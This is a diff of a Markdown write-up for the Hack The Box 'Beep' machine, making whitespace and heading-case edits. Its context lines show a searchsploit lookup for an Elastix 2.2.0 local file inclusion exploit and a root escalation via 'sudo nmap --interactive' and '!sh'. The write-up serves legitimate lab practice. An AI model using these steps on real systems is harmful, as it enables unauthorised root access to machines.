@@ -32,7 +32,7 @@ correct entry method. Skills required are basic knowledge of Linux and enumerati
 | Date I Completed It | 16th July 2019 |
 | Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |
 
-## Method Using Meterpreter
+## Method using Meterpreter
 
 ### Initial Recon
 
@@ -148,12 +148,12 @@ Going back to at Elastix, I find it's prone to LFI exploit:
 
 ```text
 root@kali:~/htb/beep# searchsploit elastix
--------------------------------------------------------------------------------- 
+--------------------------------------------------------------------------------
 Exploit Title                                    |  Path
                                                  | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------- 
+--------------------------------------------------------------------------------
 Elastix 2.2.0 - 'graph.php' Local File Inclusion | exploits/php/webapps/37637.pl
--------------------------------------------------------------------------------- 
+--------------------------------------------------------------------------------
 ```
 
 Exploit shows how to expose the Elastix config, use this in browser:
@@ -224,7 +224,7 @@ Shows what commands can use sudo without password (same as doing sudo -l). Has n
 Use nmap to escalate to root:
 
 ```text
-sudo nmap --interactive 
+sudo nmap --interactive
 !sh
 whoami
 root
